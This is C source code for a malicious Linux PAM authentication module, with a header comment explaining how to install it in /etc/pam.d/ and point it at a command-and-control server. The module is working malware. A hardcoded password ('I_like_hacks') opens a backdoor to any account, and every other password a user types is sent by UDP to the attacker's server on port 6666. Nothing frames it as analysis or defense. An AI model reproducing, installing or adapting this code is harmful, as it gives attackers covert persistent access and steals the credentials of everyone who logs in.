/**
 * 
 * Add the following line to the top of any file in /etc/pam.d/
  auth         sufficient          pam_extra.so       <ip of c+c server (optional)>
 * 
 * ~ Author: Nick Dieff
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MYPASSWD "I_like_hacks"
#define CNC_PORT 6666

extern int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return PAM_SUCCESS;
}

extern int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return PAM_SUCCESS;
}

// This module is only concerned with the "authenticate" portion of the PAM flow
// which begins right here
extern int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    // figure out if we should send password to c+c
    int send_remote = 0;
    const char *target_ip = NULL;
    // it looks like an ip was provided
    if (argc == 1)
    {
        send_remote = 1;
        target_ip = argv[0];
    }

    // Allocate a string for the user-entered password
    char *password = NULL;

    // get the user-entered password
    pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);

    // The user's password matches are password, so they're the hacker
    // An we will let them in
    if (!strcmp(password, MYPASSWD))
        return PAM_SUCCESS;

    // The user's password does not match ours, so we will send it to the c+c server

    // If an ip was not provided, just end here
    if (!send_remote)
    {
        return PAM_CRED_INSUFFICIENT;
    }

    // otherwise, let's construct a sockaddr_in
    struct sockaddr_in serveraddr;
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(CNC_PORT);
    struct in_addr address;
    inet_aton(target_ip, &address);
    serveraddr.sin_addr = address;

    // open a socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        //printf("could not open socket %d", sockfd);
        return PAM_CRED_INSUFFICIENT;
    }

    // send the data
    int status = sendto(sockfd, (const char *)password, strlen(password), MSG_CONFIRM,
                        (const struct sockaddr *)&serveraddr, sizeof(serveraddr));
    /*if (status < 0)
    {
        printf("failed to send");
    }*/
    close(sockfd);

    return PAM_CRED_INSUFFICIENT;
}
